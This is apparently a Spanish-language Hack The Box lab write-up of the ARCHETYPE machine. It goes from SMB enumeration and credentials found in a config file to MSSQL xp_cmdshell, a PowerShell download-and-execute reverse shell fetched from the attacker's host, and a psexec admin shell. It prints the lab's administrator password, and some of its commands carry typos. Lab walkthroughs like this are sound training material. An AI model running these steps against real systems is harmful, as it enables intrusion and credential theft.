---
layout: post
title:  "Starting Point ARCHETYPE"
date:   2022-05-06
excerpt: ![logo](https://githubraw.com/H4ckM1nd/h4ckm1nd.github.io/master/Capturas/Portadas/lame-portada.png)
tag:
- HTB 
- Windows
- SMB
- SQL
- EASY
comments: true
---
## Maquina Windows : EASY!!
![logo](https://githubraw.com/H4ckM1nd/h4ckm1nd.github.io/master/Capturas/Portadas/lame-portada.png)

![LOGO](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/logo%20maquina.png)

## CONCEPTOS : Windows, SMB, SQL.

Maquina Windows donde podremos aprender a explotar una mala configuración en Microsoft SQL server tratando de conseguir una reverse shell y familiarizarnos un poco con el uso de las herramientas impacket que nos ayudaran mucho en el futuro para atacar un sinfín de servicios.

## ENUMERACIÓN :

El primer paso de todo es realizar un escaneo de la red para detectar posibles puertos abiertos en el equipo objetivo. Con esta información podremos ir probando los diferentes posibles vectores de entrada y para ello utilizaremos la herramienta NMAP

`nmap -sC -sV {IP objetivo}`

> -sC=Realiza analisis con los scripts por defecto (--script=default)

> -sV=Detección version de servicios (Obtendremos la versión actual del servicio que corre por cada puerto

![NMAP_SCAN](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/Imagenes/archetype_nmap%20scan1.png)

Puertos Abiertos: 
-	445: SMB
-	1433: SQL server

El protocolo SMB se utiliza para compartir archivos y normalmente almacenan archivos de configuración que contienen contraseñas y otra información confidencial, así que vamos a tratar de conectarnos al servicio SMB y enumerar en búsqueda de esos posibles archivos utilizando smbclient (cliente de conexiones samba).

    > smbclient -N -L\\\\{IP objetivo}\\

> -N = Indica conectarnos sin contraseña

> -L = Despliega los servicios compartidos disponibles en una lista

![SMBCLIENT ENUM](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20smbclient%20ennum1.png)

Vemos un recurso interesante llamado backups(copias de seguridad) el cual podría contener información interesante. Para conectarnos a esa carpeta:

    > smbclient -N \\\\ {IP Objetivo}\\backups

Una vez conectados pasamos a listar el contenido de dicha carpeta utilizando el comando dir ya que recordar que estamos ante una maquina Windows.
Vemos un archivo llamado prod.dtsConfig que puede que contenga información.

![SMBCLIENT CONECT](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/smbclient%202%20conexion%20carpeta%20baksups.png)

Para descargarlo a nuestra maquina y poder ver su contenido utilizaremos el comando get.
(el contenido se guardará en el directorio actual donde nos encontramos trabajando en nuestra maquina)

    > get prod.dtsConfig

Ahora para leer el contenido de dicho archivo ya desde nuestra maquina, lo haremos mediante el comando cat.

    > cat prod.dtsConfig

El archivo contiene las credenciales para el usuario local de Windows ARCHETYPE\sql_svc.

![CAT PROD.DTSCONFIG](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20cat%20prod.dt.config.png)

Con las credenciales obtenidas de un usuario de SQL server, ahora solo necesitamos una forma de conectarnos y autentificarnos en el servidor SQL. Para conectarnos podemos utilizar la herramienta Impacket, la cual incluye un script en Python llamado mssqclient.py que nos permite trabajar con protocolos de red.
Para entender un poco más que es Impacket y cómo utilizarlo:

https://github.com/SecureAuthCorp/impacket

Para instalación y uso de Impacket debemos seguir los siguientes pasos.

Clonar repositorio de github con el comando git clone:

    > git clone https://github.com/SecureAuthCorp/impacket.git

Meternos dentro del directorio de impacket:

    > cd impacket

Instalar todos los módulos necesarios para que funcione la herramienta:

    > pip3 install o sudo python3 setup.py install 

(En el caso de que algun modulo diera algún tipo de error):

    > pip3 install -r requirements.txt

Ahora ya Podemos utilizar el script de Python en cuestión:

    > python3 mssqlcient.py ARCHETYPE/sql_svc@{target ip} -windows-auth

> -windows-auth = Indica que queremos logearnos con las credenciales de Windows.

Ingresamos contraseña obtenida anteriormente y ya estaríamos conectados habilitándosenos así una terminal de SQL.

![MMSCLIENT](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20mmsqlclient.py%201%20inicio%20sesion.png)

Con el comando help LISTAMOS LAS OPCIONES de la shell de SQL

Estas opciones nos describen las funcionalidades más básicas que nos ofrece, si queremos profundizar y entender más acerca de funcionamiento:

> https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

> https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

Lo primero que tenemos que hacer ahora es comprobar si tenemos permisos de administrador:

    > SELECT IS_SRVROLEMEMBER('sysadmin')

![SQL permisos](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20sql%20permisos%20tenemos%201%20null.png)

Dicha entrada nos devuelve un valor de 1 que significa TRUE o lo qué es lo mismo, que si tenemos permisos de administrador en SQL server

Con permisos de administrador ahora podemos utilizar algunas herramientas de configuración del servidor SQL, en este caso "xp_cmdshell" para habilitar una conexión remota.

Debemos verificar que xp_cmdshell este activado con el siguiente comando:

    > SQL> EXEC xp_cmdshell 'net user';

Lo activaremos siguiendo una serie de pasos:

    > EXEC sp_configure 'show advanced options', 1;

    > RECONFIGURE;

    > sp_configure; 

    > EXEC sp_configure 'xp_cmdshell', 1;

    > RECONFIGURE;

Ahora ya podemos ejecutar comandos en el sistema. Para comprobarlo:

    > SQL> xp_cmdshell "whoami"

![SQL whoami](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20xp_cmdshell%20prueba%20whoami.png)


## OBTENER REVERSE SHELL:

Una vez sabemos que podemos ejecutar comando en el sistema, vamos intentar obtener una reverse shell estable para entablar una conexión con nuestra maquina por el puerto que le indiquemos a la escucha.

Lo primero sera descargarnos una reverse shell, sustituir la IP por la de nuestro equipo, especificarle el puerto que vamos a poner a la escucha y darle permisos de ejecucion.

-	 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1, 

Una vez tenemos lista la reverse shell debemos compartirla a la maquina objetivo. Para ello utilizaremos un servidor de python por el puerto 80. (debemos levantar este servidor iniciandolo desde la misma carpeta donde tenemos la reverse shell [shell.ps1].

-	 sudo python3 -m http.server 80

Nos pondremos a la escucha desde nuestro kali por el puerto que hayamos indicado en la reverse shell para obtener ahi la conexion desde la maquina objetivo.

-	sudo nc -lvnp 443
	
Antes de todo deberemos configurar una regla de firewall para permitir conexiones desde kla ip de la mauqina objetivo mediante el protocolo TCP a los puertos 80 y 443 a nuestra maquina. Usando ufw:

-	sudo apt install -y ufw
-	sudo ufw enable
-	sudo ufw allow from {ip maquina objetivo} proto tcp to any port 80,443
-	sudo ufw status 

![firewall](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20reglas%20ufw%20.png)

Con todo listo ejecutamos el comando SQL server para descargar nuestro backdoor en la maquina objetivo y crear nuestra reverse TCP shell.

-	xp_cmdshell"powershell"IEX(NewObjectNet.WebClient).DownloadString(\"http://YourIP/nombre_script.ps1\");""

![sqlinvokerevershell](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20sql%20reverse%20shell%201.png)
	
Debería ejecutarse con éxito. El resultado en nuestro python http server que ejecuta nuestra página web de python debe mostrar un HTML 200 response code, mostrando una descarga exitosa de nuestro Powershell script.

ASI YA DEBERIAMOS OBTENER UNA REVERSE SHELL EN NUESTRO EQUIPO.

![netcat shell](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20revershell%20obtenida%20en%20kali.png)

Listamos contenido con dir y nos movemos al directorio escritorio. Listamos otra vez con dir y vemos la primera flag llamada user.txt
Para leer su contenido usamos el comando type:

-	type user.txt

![flag1](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20ls%20directory%20flag%201.png)

ASI OBTENEMOS NUETRA PRIMERA FLAG


## ESCALADA DE PRIVILEGIOS

La cuenta en la que nos encontramos no tiene permisos de administrador, pero se utiliza para gestionar servicios, lo que significa que en algún momento se aplica algún permiso de administrador. Para verificar los archivos de acceso frecuente o los comandos ejecutados, podemos revisar el historial de comandos de Powershell con el siguiente comando:

-	typeC:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

![flag1](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20cat%20console_history%20credencial%20admin.png)
	
Esto nos revela que el disco backups se ha asignado utilizando las credenciales del administrador local. 

-	User:administrator
-	Pass:Megacorp_4admin!!

> Comando net.exe asigna el recurso compartido \\archetype\backups a un nuevo dispositivo llamado “T:” CON LAS CREDENCIALEs necesarias para conectarse a el.

[La forma de descubrir esto ha sido mediante una herramienta que enumera todo el sistema en busca de posibles vulnerabilidades llamada winpeas. Que veremos mas adelante en mayor profundidad en otras maquinas]

-   https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe

Ahora que contamos con las credenciales de administrador debemos encontrar una manera de conectarnos a la maquina como usuarios admin, algo similar a SHH. Para ello echaremos otra vez mano de uno de los script de la biblioteca de Impacket llamado PsExec, la cual nos permite conectarnos a un host de Windows remoto.
Podemos usar los de Impacket psexec.pypara obtener un shell privilegiado:

-	Python3 psexec.py administrator@{ip objetivo}

![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20root%20pwned.png)

Ingresamos la contraseña de administrador encontrada anteriormente y ya tendríamos una terminal con permisos de administrador.
Veridficamos que los permisos de admin sean correctos con el comando whoami y efectivamente nos indica nt authority\system
Nos movemos al usuario administrator, vamos al escritorio y listando el contenido vemos la flag de root.

-	C:Users\Administrator\Desktop\>type root.txt

![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20root%20flag%202.png)

YA TENDRIAMOS NUESTRA FLAG ROOT Y LA MAQUINA ARCHETYPE PWNED!

![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20pwned.png)
